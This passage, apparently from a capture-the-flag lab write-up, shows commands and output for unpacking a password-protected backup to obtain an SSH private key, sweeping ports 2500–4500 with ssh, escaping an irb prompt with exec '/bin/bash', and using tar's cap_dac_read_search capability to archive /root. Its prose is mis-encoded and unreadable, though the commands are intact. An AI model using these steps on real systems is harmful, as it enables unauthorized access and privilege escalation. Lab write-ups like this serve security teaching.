‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå: ‡∏û‡∏ö‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô `zxcvbnm` (PASSWORD FOUND!!!!: pw = zxcvbnm)

2. ‡∏Ñ‡∏±‡∏î‡∏•‡∏≠‡∏Å backup.zip ‡∏°‡∏≤‡∏ó‡∏µ‡πà working directory ‡πÅ‡∏•‡πâ‡∏ß‡πÅ‡∏ï‡∏Å‡πÑ‡∏ü‡∏•‡πå

```bash
cp mount/backup.zip .
unzip backup.zip
```

![unzip](images/9.png)

- `unzip` ‡∏à‡∏∞‡∏ñ‡∏≤‡∏° password ‚Üí ‡πÉ‡∏™‡πà `zxcvbnm` ‡πÅ‡∏•‡πâ‡∏ß‡∏£‡∏∞‡∏ö‡∏ö‡∏à‡∏∞‡πÅ‡∏ï‡∏Å‡πÑ‡∏ü‡∏•‡πå‡∏†‡∏≤‡∏¢‡πÉ‡∏ô

3. ‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡πÅ‡∏ï‡∏Å‡πÑ‡∏ü‡∏•‡πå (‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡πà‡πÄ‡∏´‡πá‡∏ô)
- `home/hades/.ssh/id_rsa` (private key)
- `home/hades/.ssh/hint.txt`
- `home/hades/.ssh/authorized_keys`
- `home/hades/.ssh/flag.txt`
- `home/hades/.ssh/id_rsa.pub`

‚úÖ ‡∏Ç‡πâ‡∏≠‡∏™‡∏±‡∏á‡πÄ‡∏Å‡∏ï
- ‡∏°‡∏µ `id_rsa` (private key) ‚Üí ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ SSH ‡πÄ‡∏Ç‡πâ‡∏≤‡πÄ‡∏õ‡πá‡∏ô `hades` ‡πÑ‡∏î‡πâ (‡∏ï‡πâ‡∏≠‡∏á‡∏ï‡∏±‡πâ‡∏á permission ‡∏Å‡πà‡∏≠‡∏ô)
- ‡∏°‡∏µ `flag.txt` ‡πÉ‡∏ô‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå `.ssh` ‚Üí ‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏ü‡∏•‡πå‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏Å‡πá‡∏ö flag
- `authorized_keys` ‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô‡πÑ‡∏ü‡∏•‡πå backup ‚Üí ‡∏≠‡∏≤‡∏à‡∏ö‡∏≠‡∏Å‡∏ß‡πà‡∏≤‡∏°‡∏µ public key ‡∏ó‡∏µ‡πà‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡πÉ‡∏´‡πâ‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏≠‡∏±‡∏ï‡πÇ‡∏ô‡∏°‡∏±‡∏ï‡∏¥

## üìÇ 5 ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏ñ‡∏±‡∏î‡πÑ‡∏õ (‡∏´‡∏•‡∏±‡∏á‡πÅ‡∏ï‡∏Å backup.zip)
1. ‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏õ‡∏î‡∏π‡πÇ‡∏Ñ‡∏£‡∏á‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏ó‡∏µ‡πà‡πÅ‡∏ï‡∏Å‡∏≠‡∏≠‡∏Å‡∏°‡∏≤
```bash
cd home
ls -la
```
- ‡∏ú‡∏•: ‡∏û‡∏ö‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ `hades`

2. ‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏õ‡∏î‡∏π‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ hades
```bash
cd hades
ls -la
```

![hades](images/10.png)

‡∏ú‡∏•: ‡πÄ‡∏´‡πá‡∏ô‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå `.ssh` ‡πÄ‡∏õ‡πá‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏ã‡πà‡∏≠‡∏ô (‡πÅ‡∏•‡∏∞‡πÑ‡∏ü‡∏•‡πå/‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡∏≠‡∏∑‡πà‡∏ô ‡πÜ)

3. ‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏õ‡πÉ‡∏ô .ssh ‡πÅ‡∏•‡∏∞‡∏ï‡∏£‡∏ß‡∏à‡πÑ‡∏ü‡∏•‡πå‡∏†‡∏≤‡∏¢‡πÉ‡∏ô
```bash
cd .ssh
ls -la
```
‡∏ú‡∏•: ‡πÄ‡∏à‡∏≠‡πÑ‡∏ü‡∏•‡πå
      - `authorized_keys`
      - `flag.txt`
      - `hint.txt`
      - `id_rsa`
      - `id_rsa.pub`

## üîë 6. ‡∏ó‡∏î‡∏•‡∏≠‡∏á‡πÄ‡∏Ç‡πâ‡∏≤ SSH (‡∏ï‡∏≤‡∏° hint: 2500‚Äì4500)

üìù 1) ‡∏≠‡πà‡∏≤‡∏ô hint
```bash
cat hint.txt
# output: 2500-4500
```
üëâ ‡πÑ‡∏î‡πâ‡∏ä‡πà‡∏ß‡∏á‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Ñ‡∏∑‡∏≠ 2500‚Äì4500

üîç 2) ‡∏•‡∏≠‡∏á SSH ‡∏õ‡∏Å‡∏ï‡∏¥‡∏ó‡∏µ‡πà‡∏û‡∏≠‡∏£‡πå‡∏ï 22
```bash
ssh hades@10.201.52.151
```
‚ö†Ô∏è ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå: `Connection reset by peer` ‚Üí ‡∏û‡∏≠‡∏£‡πå‡∏ï 22 ‡πÑ‡∏°‡πà‡πÄ‡∏õ‡∏¥‡∏î‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö SSH

üîå 3) ‡∏ó‡∏î‡∏•‡∏≠‡∏á‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏ö‡∏≤‡∏á‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÉ‡∏ô‡∏ä‡πà‡∏ß‡∏á‡∏ó‡∏µ‡πà hint ‡∏£‡∏∞‡∏ö‡∏∏
```bash
ssh hades@10.201.52.151 -p2500
```
üì° ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå: ‡πÑ‡∏î‡πâ banner `SSH-2.0-SSH_v2.0@force10networks.com` ‚Üí ‡πÄ‡∏õ‡πá‡∏ô ‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢ (Force10) ‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà OpenSSH ‡∏õ‡∏Å‡∏ï‡∏¥
```bash
ssh hades@10.201.52.151 -p2501
ssh hades@10.201.52.151 -p2502
```

![ssh](images/11.png)

‚ö†Ô∏è ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå: `Connection reset by peer` ‚Üí ‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£ SSH ‡∏à‡∏£‡∏¥‡∏á

üì° 4) ‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏•‡∏≠‡∏á‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ SSH ‡∏ä‡πà‡∏ß‡∏á 2500‚Äì4500

1. ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå `Secure-shell.sh` ‡πÇ‡∏î‡∏¢‡πÉ‡∏™‡πà‡πÇ‡∏Ñ‡πâ‡∏î:
```bash
#!/bin/bash

for i in {2500..4500}
do
	ssh hades@10.201.52.151 -p$i
done
```
> (‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏à‡∏∞‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ SSH ‡∏Å‡∏±‡∏ö user hades ‡∏ö‡∏ô‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÅ‡∏ï‡πà‡∏•‡∏∞‡∏ï‡∏±‡∏ß‡πÉ‡∏ô‡∏ä‡πà‡∏ß‡∏á 2500‚Äì4500)

2. ‡∏£‡∏±‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå:
```bash
bash Secure-shell.sh
```

![3333](images/12.png)

3. ‡∏™‡∏±‡∏á‡πÄ‡∏Å‡∏ï‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏ó‡∏µ‡πà‡∏õ‡∏£‡∏≤‡∏Å‡∏è‡πÉ‡∏ô‡πÄ‡∏ó‡∏≠‡∏£‡πå‡∏°‡∏¥‡∏ô‡∏±‡∏•:
- ‡∏´‡∏•‡∏≤‡∏¢‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏ï‡∏≠‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡∏î‡πâ‡∏ß‡∏¢ `Connection reset by peer` ‚Üí ‡∏ù‡∏±‡πà‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡∏õ‡∏¥‡∏î‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏ó‡∏±‡∏ô‡∏ó‡∏µ (service ‡πÑ‡∏°‡πà‡∏£‡∏≠‡∏á‡∏£‡∏±‡∏ö SSH ‡∏´‡∏£‡∏∑‡∏≠‡∏õ‡∏è‡∏¥‡πÄ‡∏™‡∏ò‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠)
- ‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏ö‡∏≤‡∏á‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÅ‡∏™‡∏î‡∏á banner ‡πÄ‡∏ä‡πà‡∏ô `SSH-2.0-SSH_v2.0@force10networks.com` ‚Üí ‡πÄ‡∏õ‡πá‡∏ô‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡∏Ç‡∏≠‡∏á‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢ (‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà OpenSSH) ‡∏î‡∏±‡∏á‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏î‡πâ‡∏ß‡∏¢‡πÑ‡∏Ñ‡∏•‡πÄ‡∏≠‡∏ô‡∏ï‡πå SSH ‡∏ò‡∏£‡∏£‡∏°‡∏î‡∏≤‡∏≠‡∏≤‡∏à‡πÑ‡∏°‡πà‡∏ó‡∏≥‡∏á‡∏≤‡∏ô (invalid format)
- ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏ñ‡∏∂‡∏á‡∏û‡∏≠‡∏£‡πå‡∏ï 3333 ‡∏û‡∏ö‡∏ß‡πà‡∏≤‡πÇ‡∏õ‡∏£‡πÇ‡∏ï‡∏Ñ‡∏≠‡∏•‡∏ï‡∏≠‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡πÄ‡∏õ‡πá‡∏ô SSH ‡∏à‡∏£‡∏¥‡∏á‡∏à‡∏ô‡πÅ‡∏™‡∏î‡∏á fingerprint ‡πÅ‡∏•‡∏∞‡∏ñ‡∏≤‡∏° `Are you sure you want to continue connecting (yes/no/[fingerprint])?` ‚Üí ‡∏ö‡πà‡∏á‡∏ä‡∏µ‡πâ‡∏ß‡πà‡∏≤ ‡∏û‡∏≠‡∏£‡πå‡∏ï 3333 ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£ SSH (host key ‡∏ñ‡∏π‡∏Å‡∏™‡πà‡∏á‡∏°‡∏≤)

## üîì 7. ‡∏à‡∏≤‡∏Å irb ‚Üí ‡∏´‡∏•‡∏∏‡∏î‡πÄ‡∏õ‡πá‡∏ô /bin/bash (Shell escape)
- ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏î‡πâ‡∏ß‡∏¢ private key:
```bash
ssh -i id_rsa hades@10.201.52.151 -p 3333
```

![connect](images/13.png)

‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à ‡πÑ‡∏î‡πâ prompt ‡πÄ‡∏õ‡πá‡∏ô Ruby interactive shell (`irb(main):001:0>`)

### ‡∏ó‡∏≥‡πÑ‡∏°‡∏°‡∏±‡∏ô‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à (‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏™‡πà‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô)


<details>

1. Key-based authentication
- SSH ‡πÉ‡∏ä‡πâ‡∏Ñ‡∏π‡πà‡∏Å‡∏∏‡∏ç‡πÅ‡∏à `private key` (‡πÄ‡∏£‡∏≤‡∏ñ‡∏∑‡∏≠: `id_rsa`) ‡∏Å‡∏±‡∏ö `public key` (‡∏≠‡∏¢‡∏π‡πà‡∏ö‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡πÉ‡∏ô `~hades/.ssh/authorized_keys`) ‡πÅ‡∏ó‡∏ô‡∏Å‡∏≤‡∏£‡πÉ‡∏™‡πà‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô

2. ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏¢‡πà‡∏≠‡∏Ç‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏û‡∏¥‡∏™‡∏π‡∏à‡∏ô‡πå‡∏ï‡∏±‡∏ß‡∏ï‡∏ô
- ‡πÑ‡∏Ñ‡∏•‡πÄ‡∏≠‡∏ô‡∏ï‡πå (‡∏Ñ‡∏∏‡∏ì) ‡∏™‡πà‡∏á public key id (key id) ‡πÉ‡∏´‡πâ‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå -> ‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ï‡∏£‡∏ß‡∏à‡∏ß‡πà‡∏≤ public key ‡∏ô‡∏±‡πâ‡∏ô‡∏°‡∏µ‡πÉ‡∏ô `authorized_keys` ‡∏Ç‡∏≠‡∏á user `hades` ‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà
- ‡∏ñ‡πâ‡∏≤‡∏°‡∏µ ‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏™‡∏£‡πâ‡∏≤‡∏á challenge (‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏∏‡πà‡∏°) ‡πÅ‡∏•‡πâ‡∏ß‡∏Ç‡∏≠‡πÉ‡∏´‡πâ‡πÑ‡∏Ñ‡∏•‡πÄ‡∏≠‡∏ô‡∏ï‡πå‡∏•‡∏á‡∏ô‡∏≤‡∏° (sign) ‡∏î‡πâ‡∏ß‡∏¢ private key
- ‡πÑ‡∏Ñ‡∏•‡πÄ‡∏≠‡∏ô‡∏ï‡πå‡πÉ‡∏ä‡πâ `id_rsa` ‡∏•‡∏á‡∏ô‡∏≤‡∏° ‡πÅ‡∏•‡πâ‡∏ß‡∏™‡πà‡∏á‡∏Å‡∏•‡∏±‡∏ö ‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ï‡∏£‡∏ß‡∏à signature ‡∏î‡πâ‡∏ß‡∏¢ public key ‡∏ñ‡πâ‡∏≤‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á ‚Üí ‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡πÄ‡∏Ç‡πâ‡∏≤‡πÇ‡∏î‡∏¢‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏ä‡πâ‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô

3. ‡πÄ‡∏û‡∏£‡∏≤‡∏∞‡πÉ‡∏ô `backup.zip` ‡πÄ‡∏£‡∏≤‡∏û‡∏ö `id_rsa` ‡πÅ‡∏•‡∏∞‡πÉ‡∏ô‡πÑ‡∏ü‡∏•‡πå `authorized_keys` ‡∏Ç‡∏≠‡∏á `hades` ‡∏°‡∏µ **public key** ‡∏Ñ‡∏π‡πà‡∏Å‡∏±‡∏ô ‚Üí ‡∏à‡∏∂‡∏á‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡πÑ‡∏î‡πâ‡πÇ‡∏î‡∏¢‡∏ï‡∏£‡∏á
</details>

üîë ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á ssh -i id_rsa ..
- `-i` (identity file) ‡∏´‡∏°‡∏≤‡∏¢‡∏ñ‡∏∂‡∏á
> ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏ü‡∏•‡πå private key ‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÉ‡∏ä‡πâ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏û‡∏¥‡∏™‡∏π‡∏à‡∏ô‡πå‡∏ï‡∏±‡∏ß‡∏ï‡∏ô (authentication)

‡∏ó‡∏≥‡∏≠‡∏∞‡πÑ‡∏£‡∏ï‡πà‡∏≠
- ‡πÄ‡∏õ‡∏¥‡∏î‡∏´‡∏ô‡πâ‡∏≤ GTFOBins ‡∏î‡∏π entry ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö irb (irb ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ exec ‡πÇ‡∏õ‡∏£‡πÅ‡∏Å‡∏£‡∏°‡∏≠‡∏∑‡πà‡∏ô‡πÑ‡∏î‡πâ)
- ‡πÉ‡∏ä‡πâ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏à‡∏≤‡∏Å GTFOBins ‡πÄ‡∏û‡∏∑‡πà‡∏≠ spawn bash:
```ruby
exec '/bin/bash'
```

![irb](images/14.png)

- ‡∏ú‡∏•: ‡πÑ‡∏î‡πâ shell ‡∏Ç‡∏≠‡∏á‡∏£‡∏∞‡∏ö‡∏ö (bash)

## üîç 2 ‡∏ß‡∏¥‡∏ò‡∏µ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏´‡∏≤‡πÑ‡∏ü‡∏•‡πå root.txt

### 1

<details>


ü™Ñ ‡∏ï‡∏£‡∏ß‡∏à‡∏´‡∏≤ Linux Capabilities (Privilege escalation vector)

```bash
getcap -r / 2>/dev/null
```

![Capabilities](images/14-1.png)

‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏°‡∏≤‡∏¢‡∏™‡∏±‡πâ‡∏ô ‡πÜ
- `getcap` ‡∏ï‡∏£‡∏ß‡∏à‡∏´‡∏≤‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡πà‡∏°‡∏µ Linux capabilities
- `-r /` = recursive ‚Üí ‡∏™‡πÅ‡∏Å‡∏ô‡πÅ‡∏ö‡∏ö‡∏ñ‡∏≠‡∏¢‡∏´‡∏•‡∏±‡∏á/‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤‡πÇ‡∏î‡∏¢‡∏ß‡∏ô‡∏•‡∏á‡πÑ‡∏õ‡∏ó‡∏∏‡∏Å‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ‡∏à‡∏≤‡∏Å path ‡∏ó‡∏µ‡πà‡∏£‡∏∞‡∏ö‡∏∏; `/` = root directory ‚Üí ‡∏™‡πÅ‡∏Å‡∏ô‡∏ó‡∏±‡πâ‡∏á‡∏£‡∏∞‡∏ö‡∏ö

üßæ Output
```bash
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar            = cap_dac_read_search+ep
```

üìå ‡πÉ‡∏´‡πâ‡πÄ‡∏£‡∏≤‡∏°‡∏≤ Focus ‡∏ó‡∏µ‡πà‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î‡∏ó‡∏µ‡πà‡∏™‡∏≠‡∏á‡∏ã‡∏∂‡πà‡∏á‡∏°‡∏µ‡∏£‡∏≤‡∏¢‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏î‡∏±‡∏á‡∏ô‡∏µ‡πâ

üü† `/bin/tar = cap_dac_read_search+ep`
- capability: `cap_dac_read_search`
- ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ: ‡∏Ç‡πâ‡∏≤‡∏°‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡πÅ‡∏ö‡∏ö DAC (Discretionary Access Control) ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£ ‡∏≠‡πà‡∏≤‡∏ô/‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ ‡πÑ‡∏ü‡∏•‡πå‡πÅ‡∏•‡∏∞‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ ‚Üí ‡πÇ‡∏õ‡∏£‡πÅ‡∏Å‡∏£‡∏°‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡πà‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏õ‡∏Å‡∏ï‡∏¥‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ (‡πÄ‡∏ä‡πà‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏Ç‡∏≠‡∏á root).
- ‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö‡πÄ‡∏ä‡∏¥‡∏á‡∏õ‡∏è‡∏¥‡∏ö‡∏±‡∏ï‡∏¥: ‡∏ï‡∏£‡∏á‡πÅ‡∏•‡∏∞‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á ‚Äî ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ `tar` ‡πÄ‡∏û‡∏∑‡πà‡∏≠ archive ‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ‡∏Ç‡∏≠‡∏á root (‡πÄ‡∏ä‡πà‡∏ô `/root`) ‡πÅ‡∏•‡πâ‡∏ß‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏ô‡∏±‡πâ‡∏ô‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏ó‡∏µ‡πà‡∏ó‡∏µ‡πà‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏ò‡∏£‡∏£‡∏°‡∏î‡∏≤‡∏Ñ‡∏ß‡∏ö‡∏Ñ‡∏∏‡∏°‡πÑ‡∏î‡πâ (`/tmp`) ‚Üí ‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏Ç‡∏≠‡∏á root ‡πÑ‡∏î‡πâ‡∏ó‡∏±‡∏ô‡∏ó‡∏µ (root flag, credentials)
- ‡πÇ‡∏≠‡∏Å‡∏≤‡∏™‡πÉ‡∏ä‡πâ‡πÄ‡∏õ‡πá‡∏ô PrivEsc: ‡∏™‡∏π‡∏á‡πÅ‡∏•‡∏∞‡∏ï‡∏£‡∏á‡πÑ‡∏õ‡∏ï‡∏£‡∏á‡∏°‡∏≤ ‚Äî ‡πÄ‡∏õ‡πá‡∏ô‡∏ä‡πà‡∏≠‡∏á‡∏ó‡∏≤‡∏á Privilege Escalation ‡πÅ‡∏ö‡∏ö‡∏á‡πà‡∏≤‡∏¢‡πÅ‡∏•‡∏∞‡πÑ‡∏î‡πâ‡∏ú‡∏•‡πÄ‡∏£‡πá‡∏ß‡πÉ‡∏ô‡∏´‡∏•‡∏≤‡∏¢‡∏Å‡∏£‡∏ì‡∏µ

üìÇ ‡πÉ‡∏ä‡πâ tar (cap_dac_read_search) ‡∏î‡∏∂‡∏á‡πÑ‡∏ü‡∏•‡πå‡∏Ç‡∏≠‡∏á root

üß≠ ‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
‡πÉ‡∏ä‡πâ `/bin/tar` ‡∏ó‡∏µ‡πà‡∏°‡∏µ `cap_dac_read_search+ep` ‡πÄ‡∏û‡∏∑‡πà‡∏≠ archive ‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ `/root` ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏ó‡∏µ‡πà‡∏ó‡∏µ‡πà user `hades` ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏î‡πâ (‡πÄ‡∏ä‡πà‡∏ô `/tmp`) ‡πÅ‡∏•‡πâ‡∏ß‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏ü‡∏•‡πå `root.txt` ‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡πá‡∏ô **root flag**

1) ‡πÑ‡∏õ‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ‡∏ä‡∏±‡πà‡∏ß‡∏Ñ‡∏£‡∏≤‡∏ß
```bash
cd /tmp
ls
```
> ‡∏î‡∏π‡∏ß‡πà‡∏≤‡∏°‡∏µ‡∏ó‡∏µ‡πà‡∏ß‡πà‡∏≤‡∏á‡πÅ‡∏•‡∏∞‡πÄ‡∏õ‡πá‡∏ô‡∏û‡∏∑‡πâ‡∏ô‡∏ó‡∏µ‡πà‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏î‡πâ

2) ‡∏™‡∏£‡πâ‡∏≤‡∏á archive ‡∏Ç‡∏≠‡∏á /root ‡∏î‡πâ‡∏ß‡∏¢ tar
```bash
tar -cvf test.tar /root
```

<details>
	
- `tar`
‡πÇ‡∏õ‡∏£‡πÅ‡∏Å‡∏£‡∏°‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏™‡∏£‡πâ‡∏≤‡∏á/‡∏à‡∏±‡∏î‡∏Å‡∏≤‡∏£ archive (tarball)

- `-c` (create)
‡∏™‡∏£‡πâ‡∏≤‡∏á archive (‡∏Ñ‡∏•‡∏±‡∏á‡πÄ‡∏Å‡πá‡∏ö‡πÄ‡∏≠‡∏Å‡∏™‡∏≤‡∏£‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç) ‡πÉ‡∏´‡∏°‡πà

- `-v` (verbose)
‡πÅ‡∏™‡∏î‡∏á‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡πà‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ñ‡∏π‡∏Å‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏•‡∏á‡πÉ‡∏ô archive (‡πÄ‡∏´‡πá‡∏ô output ‡∏ó‡∏µ‡∏•‡∏∞‡πÑ‡∏ü‡∏•‡πå)

- `-f test.tar`
‡∏£‡∏∞‡∏ö‡∏∏‡∏ä‡∏∑‡πà‡∏≠‡πÑ‡∏ü‡∏•‡πå archive ‡πÄ‡∏õ‡πá‡∏ô `test.tar`

- `/root`
‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡πÄ‡∏Å‡πá‡∏ö‡πÄ‡∏Ç‡πâ‡∏≤ archive

